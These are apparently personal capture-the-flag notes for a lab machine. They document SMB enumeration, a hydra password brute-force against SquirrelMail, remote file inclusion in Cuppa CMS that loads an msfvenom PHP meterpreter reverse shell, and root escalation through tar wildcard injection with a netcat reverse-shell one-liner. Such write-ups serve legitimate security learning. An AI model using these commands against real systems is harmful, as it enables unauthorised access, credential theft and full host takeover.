SMB enum found users: milesdyson and anonymous
Also found log with passwords

Tried to use log to gain access to squirrelmail server
	hydra -l milesdyson -P log1.txt 10.10.185.215 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect."

Once I was able to login found password was reset on smb

smbclient //<ip>/milesdyson -U milesdyson

Found important.txt which had undiscovered directory. ﻿/45kra24zxs28v3yd
Gobuster found /administrator directory which had a cuppa server running on it.
Found exploit in exploit-db 25971 which documented remote code execution on cuppa

Created php reverse_tcp connection
	msfvenom -p php/meterpreter/reverse_tcp LHOST=10.2.42.149 LPORT=4444 -f raw -o rev_met.php
	
Set up multihandler for metasploit
	set PAYLOAD php/meterpreter/reverse_tcp

Set up python http server
	Ran "http://<IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<myIP>:8000/rev_met.php"

Once on server I was able to take advantage of cron backup job with following commands. Not exactly sure how or why this works. Need to be in /var/www/html to run. Has something to do with tar command wildcards.
	echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip> 1234 >/tmp/f" > shell.sh
	touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
	touch "/var/www/html/--checkpoint=1"

